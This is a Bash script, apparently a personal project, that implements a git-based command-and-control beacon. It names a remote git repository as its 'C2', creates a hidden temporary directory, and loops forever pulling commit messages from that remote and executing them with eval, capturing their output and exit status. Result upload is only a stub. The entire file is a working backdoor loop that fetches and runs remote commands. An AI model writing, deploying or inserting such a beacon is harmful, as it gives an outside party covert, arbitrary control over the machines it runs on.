#!/usr/bin/env bash
# Heavily uses bashisms, do not port to POSIX sh

log () {
	local level ansi

	level="${1}"
	shift
	case "${level}" in
		(fatal) ansi="41;30" ;;
		(err) ansi="31" ;;
		(warn) ansi="33" ;;
		(debug) ansi="90" ;;
		(*) ansi="45;30" ;;
	esac
	printf "\033[${ansi}m%s: %s: %s: %s\033[m\n" "${0}" "${FUNCNAME[2]}" "${BASH_LINENO[1]}" "$*" >&2
}

fatal () {
	log fatal "${@}"
}

err () {
	log err "${@}"
}

warn () {
	log warn "${@}"
}

debug () {
	log debug "${@}"
}

C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
BEACON_ID="$(hostname -s)" || BEACON_ID="${HOSTNAME%%.*}"
[ -n "${BEACON_ID}" ] || { err "error setting beacon id"; exit 1; }
POLL_RATE="1"
unset CDPATH

tmpdir="$(mktemp -d -p /tmp .gitc2beaconXXXXXXXXX)" || { err "error creating tmpdir"; exit 1; }
orig_dir="$(pwd)" || { warn "error changing to tmpdir (not exiting)"; }
cd -- "${tmpdir}" || { err "error changing to tmpdir"; exit 1; }

_grey () {
	printf '\033[90m' >&2
}

_rst () {
	printf '\033[m' >&2
}

# Remove temporary directory and cd back to a sane place
_cleanup () {
	printf '\n'
	if [ "${DEBUG}" = "on" ]
	then
		warn "Cleaning up..."
		_grey
			cd /
			rm -rfv -- "${tmpdir}" || { err "error deleting tmpdir"; }
			cd -- "${orig_dir}" || cd || cd -- "${HOME}" || cd -- ~ || pwd
		_rst
	fi
	warn "Exiting"
} && trap _cleanup EXIT

_fetch_next_command () {
	local next_id stdin

	git show-ref "${BEACON_ID}" \
		|| { warn "Pull failed (ref doesnt exist)"; return 1; }
	git pull \
		|| { warn "Pull failed"; return 1; }
	next_id="$(comm -23 <(git log --author=in --format=%ae | sort) <(git log --author=out --format=%ae | sort) | sort -n | head -1)"
	stdin="$(git log -1 --author="${next_id}" --format=%s ; printf .)"
	stdin="${stdin%.}"
	printf '%s' "${stdin}"
}

_send_result () {
	echo "Sent!"
}

# Override git command to make it DEBUG aware
git () {
	local subcomand

	subcomand="${1}"
	[ -n "${subcomand}" ] || { command git; return 1; }
	shift
	if [ "${DEBUG}" = "on" ]
	then
		_grey
			command git "${subcomand}" "${@}"
			status="${?}"
		_rst
		return "${status}"
	else
		2>/dev/null 1>&2 command git "${subcomand}" -q "${@}"
	fi
}

# TODO: Make asynchronous, you don't want to lose the
# connection when you send a blocking/neverending command
_fetch_eval () {
	local cmd status pipestatus elapsed

	cmd="$(_fetch_next_command ; printf .)"
	cmd="${cmd%.}"
	[ "${DEBUG}" = "on" ] && { debug "${cmd@A}"; return 1; }
	[ -n "${cmd}" ] || return 1
	SECONDS="0"
	eval "${cmd}" 1>stdout 2>stderr
	status="${?}"
	pipestatus="${PIPESTATUS[@]@A}"
	elapsed="${SECONDS}"
	_send_result stdout stderr "${status}" "${pipestatus}" "${elapsed}"
}

init () {
	git init
	git remote add c2 "${C2}"
	git show-ref "${BEACON_ID}" \
		&& git pull c2 "${BEACON_ID}" \
		|| git branch "${BEACON_ID}"
	git checkout "${BEACON_ID}"
	git branch --set-upstream-to="c2/${BEACON_ID}"
	if [ "${DEBUG}" = "on" ]
	then
		_grey
			pwd
			ls -al
			printf '%s\n' "${C2@A}"
			printf '%s\n' "${BEACON_ID@A}"
			printf '%s\n' "${POLL_RATE@A}"
			printf '\n'
		_rst
	fi
}

loop () {
	while :
	do
		_fetch_eval
		sleep "${POLL_RATE}"
	done
}

main () {
	init
	loop
}

main
